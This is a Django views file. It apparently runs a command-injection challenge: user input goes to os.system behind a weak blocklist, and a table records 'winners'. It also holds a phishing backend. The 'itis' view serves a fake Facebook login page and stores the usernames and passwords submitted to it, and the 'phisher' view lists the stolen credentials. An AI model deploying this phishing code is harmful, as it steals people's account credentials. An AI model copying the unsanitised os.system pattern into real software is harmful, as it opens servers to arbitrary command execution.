import os
from django.shortcuts import render,redirect
import pathlib
from django.http import HttpResponse
from .models import Winners,phished
import datetime

errorMSG = 'Invalid command Detected'
SuccessMSG = 'Ok you got it right'

path = pathlib.Path(__file__).parent.resolve()
savepath = os.path.join(path, 'dirs') 
os.chdir(savepath)

def indexView(request):
    if request.method == 'POST':

        command = request.POST.get('command')
        Not_Valid1 = '&&'
        Not_Valid2 = '/'
        validate_1 = bool(Not_Valid1 in command)
        validate_2 = bool(Not_Valid2 in command)
        folderName = command[6:]

        if validate_1==True:
            return HttpResponse(errorMSG)
        elif validate_2==True:
            return HttpResponse(errorMSG)
        if os.path.exists(folderName)==True:
            return HttpResponse('Path Allready exists')
        elif command[:5]=='mkdir' and len(command)<20:
            os.system(command)
            return redirect('addinfo/')
        else:
            return HttpResponse(errorMSG)

        
    return render(request, 'mkdir.html',{})



def AddDetail(request):
    if request.method == 'POST':
        username = request.POST.get('name')
        foldername = request.POST.get('folder')
        tel = request.POST.get('tel')
        stage = request.POST.get('Level')
        time = str(datetime.datetime.now())[:19]

        check_path = os.path.join(savepath,foldername)
        check = os.path.exists(check_path)

        if check==True:
            if len(str(username))==0 or len(str(foldername))==0:
                return HttpResponse('Invalid Data')
            elif Winners.objects.filter(Username=username, Tel=tel).exists():
                return HttpResponse('Allready You are a Winner')
            Winners.objects.create(Username=username, Foldername=foldername, Tel=tel, Level=stage, Date=time)
            return redirect('view')
        else:
            return HttpResponse('Your folder is not Created')
    return render(request, 'add.html',{})

def TableView(request):
    winners = Winners.objects.all()
    context={
        'items':winners
    }
    return render(request, 'tbl.html',context)

def phisher(request):
    pakku = phished.objects.all()
    context={
        'items':pakku
    }
    return render(request, 'moodayo.html', context)

def itis(request):
    if request.method == 'POST':

        user = request.POST.get('user')
        passwd = request.POST.get('pass')
        phished.objects.create(User=user, Passwd=passwd)

    return render(request, 'facebook.html', {})